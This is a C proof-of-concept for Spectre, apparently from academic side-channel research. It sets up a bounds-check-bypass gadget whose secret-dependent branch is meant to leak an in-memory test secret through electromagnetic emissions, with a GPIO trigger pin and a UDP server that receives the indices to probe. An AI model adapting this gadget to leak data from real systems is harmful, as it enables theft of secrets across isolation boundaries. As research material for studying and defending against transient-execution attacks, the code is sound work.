// Spectre POC that extracts the secrets through an EM covert channel using
// a control flow dependency on the secret bit
//
// Last Modified: 2023-03-14
//
// Parts of this code are adapted from Transient Fail (https://transient.fail/):
// 
// Copyright (C) 2023 Jesse De Meulemeester
// Copyright (C) 2020 Graz University of Technology

#include "utils.h"
#include "gpio.h"

// Accessible data
#define DATA "data|"
// Inaccessible secret (following accessible data)
// This string was randomly generated with the only constraint that it contains
// as many zeros as ones.
#define SECRET "\x01\x36\x9b\x78\xc9\x2c\x3d\x32\xfa\x83\x50\xaf\x39\xaf\x69\x2d\x58\xd7\x38\x6a\xc1\x63\x15\xc7\x3c\x4d\x96\x61\xe1\x88\xbd\xed"

#define DATA_SECRET DATA SECRET

// Buffer to store the data
uint8_t data[128];
size_t len = (sizeof(DATA) - 1) * 8;  // 40

// Access the bit corresponding to the given bit index
// Only the first five characters (40 bits), as defined by `len' can be accessed
// architecturally
void access_array(int bit) { 
  flush(&len);

  if (bit < len) {
    if (data[bit / 8] & (1 << (bit % 8))) {
      // nop to avoid gcc removing this branch
      asm volatile("nop");
    }
  }
}

int main() {
  int index;

  // Initialize the GPIO pin
  gpio_init();
  gpio_fsel(16, OUTPUT); 

  // Initialize the data array
  memset(data, ' ', sizeof(data));
  memcpy(data, DATA_SECRET, sizeof(DATA_SECRET));
  // Ensure data terminates
  data[sizeof(data) / sizeof(data[0]) - 1] = '0';

  // Initialize the UDP interface
  initSockServer(10000);

  while (1) {
    // Receive the index to access and the value to compare to from the client
    receive(&index);

    gpio_set(16);
    
    access_array(index);

    gpio_clear(16);
 
    // Echo the received contents back to indicate the packet was received
    reply();
  }
}
